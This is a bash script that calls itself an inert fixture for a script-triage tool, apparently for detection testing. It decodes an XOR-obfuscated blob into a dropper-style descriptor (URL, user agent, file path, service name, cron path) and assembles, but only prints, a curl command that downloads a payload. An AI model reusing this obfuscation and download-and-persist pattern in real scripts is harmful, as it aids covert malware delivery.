#!/usr/bin/env bash

# Huntress Script Triage -- inert static-analysis fixture (bash_linux)

readonly Material_d4046530='65:3e:ca:1b:28:67:66:8b:14:66:72:60:8a:12:32:61:66:a4:15:3e:7e:6c:8f:02:77:64:71:92:13:3e:4c:65:92:0b:3e:6f:62:9f:06:2b:67:66:89:5a:38:66:71:97:38:34:66:77:8b:12:2f:6f:70:8f:06:3c:76:5c:98:08:2e:7d:77:c6:56:27:70:62:96:17:3a:7a:64:95:38:32:77:3e:98:06:36:63:62:92:00:35:3e:3b:9a:5e:3a:70:37:98:53:62:72:7f:8e:15:37:2e:6b:8f:13:2b:60:39:d4:48:63:72:3a:9a:04:6f:70:37:c2:06:75:76:7b:9a:0a:2b:7f:66:d5:0e:35:65:62:97:0e:3f:3c:33:c3:57:6e:77:35:cb:04:75:60:6b:87:12:28:76:71:a4:06:3c:76:6d:8f:5a:13:66:6d:8f:15:3e:60:70:b7:06:39:3c:3b:9a:5e:3a:70:37:98:53:62:72:7f:9d:0e:37:76:5c:8b:06:2f:7b:3e:d4:13:36:63:2c:93:12:35:67:71:9e:14:28:3e:60:9a:04:33:76:2c:d5:14:2f:72:64:9e:4a:63:72:3a:9a:04:6f:70:37:c2:06'

readonly Codec_d4046530='hex_colon|repeating_key_xor|13,03,fb,67,5b'



Load_d4046530() {

  e=()

  local IFS=':' p

  local -a pieces

  read -r -a pieces <<< "${Material_d4046530}"

  for p in "${pieces[@]}"; do e+=("$((16#$p))"); done

}



Decode_d4046530() {

  d=()

  local -a key_bytes=(19 3 251 103 91)

  local i

  for ((i=0; i<${#e[@]}; i++)); do

    d+=("$((e[i] ^ key_bytes[i % ${#key_bytes[@]}]))")

  done

}



Recover_d4046530() {

  local -a e d

  local t n z i

  local -a compass=(north south); n="$(IFS=:; printf '%s' "${compass[*]}")"

  Load_d4046530

  local decode_target=Decode_d4046530; "$decode_target"

  t=''

  local octal character

  for i in "${!d[@]}"; do

    printf -v octal '%03o' "${d[i]}"

    printf -v character '%b' "\\$octal"

    t+="$character"

  done

  printf '%s\n' "$t"

}



Inspect_d4046530() { local recovered; recovered="$(Recover_d4046530)"; printf '%s\n' "$recovered"; }



Plan_d4046530() {

  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''

  descriptor="$(Inspect_d4046530)"

  local -a fields

  IFS='|' read -r -a fields <<< "$descriptor"

  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done

  local -a request_command=(curl --fail --silent --show-error -o "$file_path" "$url")

  declare -p request_command

}



if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_d4046530; fi

